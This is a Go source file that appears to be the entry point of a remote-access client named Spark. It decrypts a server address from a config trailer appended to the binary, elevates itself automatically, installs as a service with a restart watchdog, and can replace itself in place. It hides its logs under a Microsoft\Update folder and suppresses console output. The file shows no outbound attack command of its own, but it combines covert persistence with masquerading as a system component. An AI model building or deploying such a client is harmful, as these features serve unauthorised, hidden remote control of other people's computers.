package main

import (
	"Spark/client/config"
	"Spark/client/core"
	"Spark/client/lifecycle"
	"Spark/utils"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kataras/golog"
)

func init() {
	golog.SetTimeFormat(`2006/01/02 15:04:05`)
	initLogging()
	golog.Info(`client init start`)

	rawBuffer, err := config.RawConfig()
	if err != nil || len(rawBuffer) < 2 {
		golog.Errorf("config trailer load failed: %v", err)
		os.Exit(1)
		return
	}
	dataLen := int(binary.BigEndian.Uint16(rawBuffer[:2]))
	if dataLen <= 0 || dataLen > len(rawBuffer)-2 {
		golog.Errorf("config trailer length invalid: %d", dataLen)
		os.Exit(1)
		return
	}
	cfgBytes := rawBuffer[2 : 2+dataLen]
	cfgBytes, err = decrypt(cfgBytes[16:], cfgBytes[:16])
	if err != nil {
		golog.Errorf("config decrypt failed: %v", err)
		os.Exit(1)
		return
	}
	err = utils.JSON.Unmarshal(cfgBytes, &config.Config)
	if err != nil {
		golog.Errorf("config unmarshal failed: %v", err)
		os.Exit(1)
		return
	}
	if len(config.Config.Path) == 0 {
		config.Config.Path = `/`
	} else if !strings.HasPrefix(config.Config.Path, `/`) {
		config.Config.Path = `/` + config.Config.Path
	}
	if len(config.Config.Path) > 1 && strings.HasSuffix(config.Config.Path, `/`) {
		config.Config.Path = config.Config.Path[:len(config.Config.Path)-1]
	}
	golog.Infof("config loaded host=%s port=%d secure=%v path=%s", config.Config.Host, config.Config.Port, config.Config.Secure, config.Config.Path)
}

func main() {
	golog.Info(`client main start`)
	// Handle update mechanism first (preserve existing logic)
	if len(os.Args) > 1 && (os.Args[1] == `--update` || os.Args[1] == `--clean`) {
		update()
		return
	}

	// Elevate automatically when needed so service install succeeds on double-click.
	lifecycle.EnsureElevated()

	// Detect run mode
	mode := lifecycle.DetectMode(os.Args)

	// For update mode, run the update function
	if mode == lifecycle.RunModeUpdate {
		update()
		return
	}

	// Create application wrapper
	app := &sparkApp{}

	// Create platform-specific components
	installer := lifecycle.NewInstaller()
	svcCtrl := lifecycle.NewServiceController(installer.GetInstallPath())

	// Run based on mode
	runner := lifecycle.NewRunner(app, installer, svcCtrl)
	// Start watchdog only for the service host so worker sessions do not
	// compete with SCM-managed restarts.
	if mode == lifecycle.RunModeService {
		lifecycle.StartWatchdog(installer, svcCtrl)
	}
	if err := runner.Run(mode); err != nil {
		golog.Error(err)
		os.Exit(1)
	}
}

// sparkApp implements lifecycle.Application
type sparkApp struct{}

func (s *sparkApp) Run(ctx context.Context) error {
	return core.StartWithContext(ctx)
}

func update() {
	selfPath, err := os.Executable()
	if err != nil {
		selfPath = os.Args[0]
	}
	if len(os.Args) > 1 && os.Args[1] == `--update` {
		if len(selfPath) <= 4 {
			return
		}
		destPath := selfPath[:len(selfPath)-4]
		thisFile, err := os.ReadFile(selfPath)
		if err != nil {
			return
		}
		os.WriteFile(destPath, thisFile, 0755)
		cmd := exec.Command(destPath, `--clean`)
		if cmd.Start() == nil {
			os.Exit(0)
			return
		}
	}
	if len(os.Args) > 1 && os.Args[1] == `--clean` {
		<-time.After(3 * time.Second)
		os.Remove(selfPath + `.tmp`)
	}
}

func decrypt(data []byte, key []byte) ([]byte, error) {
	// MD5[16 bytes] + Data[n bytes]
	dataLen := len(data)
	if dataLen <= 16 {
		return nil, utils.ErrEntityInvalid
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, data[:16])
	decBuffer := make([]byte, dataLen-16)
	stream.XORKeyStream(decBuffer, data[16:])
	hash, _ := utils.GetMD5(decBuffer)
	if !bytes.Equal(hash, data[:16]) {
		return nil, utils.ErrFailedVerification
	}
	return decBuffer[:dataLen-16], nil
}

func initLogging() {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	logDir := filepath.Join(programData, "Microsoft", "Update")
	logPath := filepath.Join(logDir, "client.log")

	golog.SetLevel("info")

	// Try primary log location
	if err := os.MkdirAll(logDir, 0755); err == nil {
		if f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644); err == nil {
			golog.SetOutput(f)
			golog.Infof("Logging to %s", logPath)
			return
		}
	}

	// Fallback to temp dir
	fallback := filepath.Join(os.TempDir(), "spark_client.log")
	if f, err := os.OpenFile(fallback, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644); err == nil {
		golog.SetOutput(f)
		golog.Infof("Logging to %s (fallback)", fallback)
		return
	}

	// Last resort: discard logging to prevent console window flash
	golog.SetOutput(io.Discard)
	// Note: Can't log this message since output is discarded
}
